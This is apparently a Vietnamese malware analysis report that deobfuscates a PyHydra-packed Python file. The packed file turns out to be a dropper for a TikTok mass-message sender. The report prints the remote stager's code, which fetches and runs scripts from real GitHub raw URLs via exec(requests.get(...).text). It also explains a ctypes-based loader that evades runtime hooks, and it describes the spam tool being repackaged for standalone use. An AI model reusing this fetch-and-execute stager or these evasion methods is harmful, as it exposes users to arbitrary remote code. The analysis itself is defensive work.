# Author: tdinh cute
# Research & Analysis by tdinh

# Báo Cáo Phân Tích & Giãi Mã Chi Tiết: `input/xuanthang.py`

- **Author / Analyst**: tdinh
- **Decoded by**: tdinh cute
- **Mục tiêu**: `input/xuanthang.py` (Kích thước gốc: 544,524 bytes)
- **Kết luận an ninh**: ⚠️ **CẢNH BÁO NGUY HIỂM: REMOTE CODE EXECUTION (RCE) / DROPPER**
- **File sạch đã cứu hộ**: [`output/tools_sach/tiktok_sender_xuanthang_clean.py`](file:///d:/THAY%20THẾ/deobf/output/tools_sach/tiktok_sender_xuanthang_clean.py)
- **File cách ly mã độc**: [`output/chua_file_co_ma_doc/xuanthang_stager_malware.py`](file:///d:/THAY%20THẾ/deobf/output/chua_file_co_ma_doc/xuanthang_stager_malware.py)

---

## 1. Kiến Trúc Mã Độc & Chuỗi Đóng Gói (5 Lớp Obfuscation)

File `xuanthang.py` sử dụng kỹ thuật đóng gói đa tầng cực kỳ tinh vi của obfuscator **PyHydra** kết hợp nhiều thuật toán nén và nạp động qua C-API:

```
[Layer 1: PyHydra Wrapper]
       │
       ▼ (Base64 Ascii85 + zlib)
[Layer 2: PyHydra Anti-Tamper Engine]
       │  (Vòng lặp rác, bẫy MemoryError, gọi PyMarshal_ReadObjectFromString + PyEval_EvalCode qua ctypes)
       ▼
[Layer 3: Marshaled Code Object (Python 3.12)]
       │  (Hằng số nhúng 178,209 bytes: Ascii85 -> bz2 -> lzma)
       ▼
[Layer 4: Decompressed Bytecode 720,126 bytes]
       │  (Mã hóa chuỗi URL bằng XOR 217, thực thi exec(requests.get(url_map).text))
       ▼
[Layer 5: Remote C2 Stager trên GitHub]
       │  URL: https://raw.githubusercontent.com/kbao1331-stack/Testa/refs/heads/main/hkaito.py
       │  Key: "xuanthang" -> https://raw.githubusercontent.com/kbao1331-stack/Testa/refs/heads/main/tik.py
       ▼
[Final Payload: Tool Sender Tiktok Infinite Time (Clean Standalone Tool)]
```

---

## 2. Chi Tiết Kỹ Thuật Từng Lớp

### Tầng 1: Lớp Vỏ PyHydra
- Metadata:
  - `__OWN__ = "Nguyễn Xuân Trịnh & Phạm Anh Tiến"`
  - `__OBF__ = "PyHydra"`
  - `__USR__ = "Hsigma plan v1_free - main - Non Requests Protect"`
- Tại dòng 43, chương trình gọi `__PyHydragon__().쬝쥱늻곛릔땺큵핦쥚봠뼼(b'Gb"-6BmV)...')`.
- Giải mã: `zlib.decompress(base64.a85decode(payload))` thu được 1,847,105 ký tự mã nguồn Python.

### Tầng 2: Loader Ctypes C-API Bỏ Qua Giám Sát Python
- Mã nguồn tầng 2 thiết lập:
  - `PyMarshal_ReadObjectFromString`: hàm C-API đọc marshaled bytecode trực tiếp từ bộ nhớ C.
  - `PyEval_EvalCode`: hàm C-API thực thi mã bytecode.
- Kỹ thuật này giúp PyHydra qua mặt hầu hết các công cụ hook `marshal.loads` hoặc `exec` thông thường trong Python runtime.

### Tầng 3 & 4: Nén Đa Tầng & Trích Xuất URL Độc Lập
- Trong khối bytecode của tầng 2, hằng số `const 1141` chứa 178,209 bytes.
- Chuỗi giải nén:
  1. `base64.a85decode(c1141)` (kết quả có header `BZh91AY&SY` - BZIP2).
  2. `bz2.decompress(data)` (kết quả có header `\xfd7zXZ\x00` - LZMA2/XZ).
  3. `lzma.decompress(data)` thu được 720,126 bytes bytecode Python 3.12 nguyên bản.
- Phân tích bytecode tại offset `103918 - 104524`:
  - Mảng số: `(177, 173, 173, 169, 170, 227, 246, 246, 171, 184, 174, ...)`
  - Giải mã XOR với khóa `217`:
    👉 **`https://raw.githubusercontent.com/kbao1331-stack/Testa/refs/heads/main/hkaito.py`**
  - Ngay sau đó là lệnh thực thi trực tiếp:
    ```python
    except MemoryError:
        exec(requests.get(url_map).text)
    ```

---

## 3. Phân Tích Remote Stager & Payload Thực Tế

### Remote Stager: `hkaito.py`
Tải trực tiếp từ GitHub `kbao1331-stack/Testa`:
```python
import requests

try:
    with open("key.txt", "r") as f:
        chon = f.read().strip()

    url_map = {
        "bynbkh"    : 'https://raw.githubusercontent.com/kbao1331-stack/Testa/refs/heads/main/duyan.py',
        "makeforvps": 'https://raw.githubusercontent.com/kbao1331-stack/Testa/refs/heads/main/vps.py',
        "test"      : 'https://raw.githubusercontent.com/kbao1331-stack/Testa/refs/heads/main/aevk.py',
        "mabaonam"  : 'https://raw.githubusercontent.com/kbao1331-stack/Testa/refs/heads/main/ankhanh.py',
        "limitedrw" : 'https://raw.githubusercontent.com/kbao1331-stack/Testa/refs/heads/main/add.py',
        "xuanthang" : 'https://raw.githubusercontent.com/kbao1331-stack/Testa/refs/heads/main/tik.py',
        "kaitodz"   : 'https://raw.githubusercontent.com/kbao1331-stack/Testa/refs/heads/main/v4.py',
        "ducanhdz"  : 'https://raw.githubusercontent.com/kbao1331-stack/Testa/refs/heads/main/sharelink.py'
    }
    
    if chon in url_map:
        exec(requests.get(url_map[chon]).text)
    else:
        print("key sai")
```
- Khóa tương ứng với file user gửi (`xuanthang.py`) chính là key `"xuanthang"`, trỏ tới file **`tik.py`**.

### Payload Thực Tế: `tik.py`
- Tên tool: **Tool Sender Tiktok Infinite Time 🪐**
- Chức năng:
  - Gửi tin nhắn hàng loạt vào các nhóm / box chat trên TikTok qua API Web (`https://im-api-sg.tiktok.com/v1/message/send`).
  - Sử dụng Protobuf, mã hóa chữ ký số DPoP (`ES256` trên đường cong `SECP256R1`), quản lý Cookies đa luồng (`threading`).
  - **Không chứa mã độc đánh cắp tài khoản (no token stealer / no webhook)**.
  - Tuy nhiên, việc bị bao bọc trong Dropper khiến người dùng có nguy cơ bị tải mã độc từ xa bất cứ lúc nào!

---

## 4. Xử Lý Cứu Hộ & Khắc Phục

1. **Tách rời payload hoàn toàn khỏi server C2:**
   - Đã gỡ bỏ toàn bộ cơ chế tải từ xa `exec(requests.get(...))`.
   - Tool hoạt động offline độc lập, không còn phụ thuộc file `key.txt` hay mạng C2 của tác giả.
2. **Branding & Lưu trữ:**
   - Đã gắn header: `# Author: tdinh` & `# Decoded by: tdinh cute`.
   - Đã lưu file sạch tại:
     - [`output/tools_sach/tiktok_sender_xuanthang_clean.py`](file:///d:/THAY%20THẾ/deobf/output/tools_sach/tiktok_sender_xuanthang_clean.py)
     - [`output/tiktok_sender_xuanthang_clean.py`](file:///d:/THAY%20THẾ/deobf/output/tiktok_sender_xuanthang_clean.py)
   - Lưu trữ bản phân tích mã độc tại:
     - [`output/chua_file_co_ma_doc/xuanthang_stager_malware.py`](file:///d:/THAY%20THẾ/deobf/output/chua_file_co_ma_doc/xuanthang_stager_malware.py)
